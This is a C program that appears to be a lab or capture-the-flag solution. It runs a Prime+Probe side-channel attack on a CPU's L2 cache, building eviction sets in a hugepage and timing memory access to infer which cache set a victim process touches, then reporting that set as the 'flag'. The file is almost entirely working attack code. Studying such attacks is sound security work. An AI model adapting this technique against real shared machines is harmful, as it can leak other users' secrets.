// attacker.c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>   // for sleep()
#include <sys/mman.h>
#include <string.h>
#include "util.h"     // for measure_one_block_access_time(), rdtscp64()

#define NUM_L2_CACHE_SETS 1024     // Number of L2 cache sets (for Skylake)
#define L2_WAYS 4                  // 4-way associative
#define CACHE_LINE_SIZE 64         // 64 Bytes per cache line
#define HUGEPAGE_SIZE (2 * 1024 * 1024) // 2MB hugepage
#define ADDRESSES_PER_SET 8        // Number of addresses per set for eviction
#define NUM_TRIALS 1000            // Number of trials to run
#define WAIT_TIME 2000             // Microseconds to wait between prime and probe (2ms)

// Allocate a hugepage - replacement for get_buffer() if it's not available
uint8_t* allocate_hugepage() {
    void* addr = mmap(NULL, HUGEPAGE_SIZE, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
    
    if (addr == MAP_FAILED) {
        perror("Failed to allocate hugepage");
        return NULL;
    }
    
    // Access the memory to ensure it's allocated
    memset(addr, 0, HUGEPAGE_SIZE);
    
    return (uint8_t*)addr;
}

// Find cache set index for an address
// For 2MB hugepage with 64B lines, index bits are 6-15 for L2 cache
uint32_t get_cache_set(uint8_t* addr) {
    return ((uint64_t)addr >> 6) & (NUM_L2_CACHE_SETS - 1);
}

// Find addresses that map to a specific cache set
void find_eviction_set(uint8_t* buffer, uint32_t target_set, uint8_t** eviction_set, int count) {
    int found = 0;
    
    for (uint64_t i = 0; i < HUGEPAGE_SIZE - CACHE_LINE_SIZE && found < count; i += CACHE_LINE_SIZE) {
        if (get_cache_set(buffer + i) == target_set) {
            eviction_set[found++] = buffer + i;
        }
    }
}

// Prime the cache by accessing addresses in the eviction set
void prime_cache_set(uint8_t** eviction_set, int count) {
    for (int i = 0; i < count; i++) {
        *(volatile uint8_t*)(eviction_set[i]) = 1;
    }
}

// Probe a cache set and measure access time
uint64_t probe_cache_set(uint8_t** eviction_set, int count) {
    uint64_t total_time = 0;
    
    for (int i = 0; i < count; i++) {
        total_time += measure_one_block_access_time((uint64_t)eviction_set[i]);
    }
    
    return total_time / count;
}

int main() {
    // Try to get buffer using get_buffer() if it exists, otherwise allocate our own
    uint8_t *buffer = NULL;
    
    // Since we don't see get_buffer() defined, use our own allocation
    buffer = allocate_hugepage();
    
    if (buffer == NULL) {
        printf("Failed to allocate buffer.\n");
        return 1;
    }

    printf("Attacker started.\n");

    // Create eviction sets for each cache set
    uint8_t ***eviction_sets = (uint8_t***)malloc(NUM_L2_CACHE_SETS * sizeof(uint8_t**));
    for (int i = 0; i < NUM_L2_CACHE_SETS; i++) {
        eviction_sets[i] = (uint8_t**)malloc(ADDRESSES_PER_SET * sizeof(uint8_t*));
        find_eviction_set(buffer, i, eviction_sets[i], ADDRESSES_PER_SET);
    }

    // Count hits for each cache set
    int *hit_counts = (int *)calloc(NUM_L2_CACHE_SETS, sizeof(int));
    uint64_t *baseline_times = (uint64_t *)malloc(NUM_L2_CACHE_SETS * sizeof(uint64_t));
    
    // Get baseline latencies (for comparison)
    for (int set = 0; set < NUM_L2_CACHE_SETS; set++) {
        baseline_times[set] = probe_cache_set(eviction_sets[set], ADDRESSES_PER_SET);
    }
    
    printf("Running attack (%d trials)...\n", NUM_TRIALS);
    
    // Prime+Probe attack
    for (int trial = 0; trial < NUM_TRIALS; trial++) {
        // Prime all cache sets
        for (int set = 0; set < NUM_L2_CACHE_SETS; set++) {
            prime_cache_set(eviction_sets[set], ADDRESSES_PER_SET);
        }
        
        // Wait for victim to access the target set
        usleep(WAIT_TIME);
        
        // Probe all sets and record hits
        uint64_t max_latency = 0;
        int max_latency_set = -1;
        
        for (int set = 0; set < NUM_L2_CACHE_SETS; set++) {
            uint64_t latency = probe_cache_set(eviction_sets[set], ADDRESSES_PER_SET);
            
            // Only consider significant latency increases
            uint64_t latency_increase = latency > baseline_times[set] ? 
                                        latency - baseline_times[set] : 0;
                                        
            if (latency_increase > max_latency) {
                max_latency = latency_increase;
                max_latency_set = set;
            }
        }
        
        if (max_latency_set >= 0) {
            hit_counts[max_latency_set]++;
        }
        
        // Progress indicator
        if (trial % 100 == 0) {
            printf(".");
            fflush(stdout);
        }
    }
    printf("\n");
    
    // Find the set with the most hits
    int flag_guess = 0;
    int max_hits = 0;
    
    for (int set = 0; set < NUM_L2_CACHE_SETS; set++) {
        if (hit_counts[set] > max_hits) {
            max_hits = hit_counts[set];
            flag_guess = set;
        }
    }
    
    // Print top 3 candidates for verification
    printf("Top candidates for the flag:\n");
    for (int i = 0; i < 3; i++) {
        int max_set = -1;
        int curr_max = 0;
        
        for (int set = 0; set < NUM_L2_CACHE_SETS; set++) {
            if (hit_counts[set] > curr_max) {
                curr_max = hit_counts[set];
                max_set = set;
            }
        }
        
        if (max_set >= 0) {
            printf("%d: Set %d with %d hits (%.2f%%)\n", 
                   i+1, max_set, hit_counts[max_set], 
                   (float)hit_counts[max_set] * 100 / NUM_TRIALS);
            hit_counts[max_set] = 0; // Mark as counted
        }
    }
    
    printf("\nFinal Guessed Flag: %d\n", flag_guess);
    
    // Free memory
    for (int i = 0; i < NUM_L2_CACHE_SETS; i++) {
        free(eviction_sets[i]);
    }
    free(eviction_sets);
    free(hit_counts);
    free(baseline_times);
    munmap(buffer, HUGEPAGE_SIZE);
    
    return 0;
}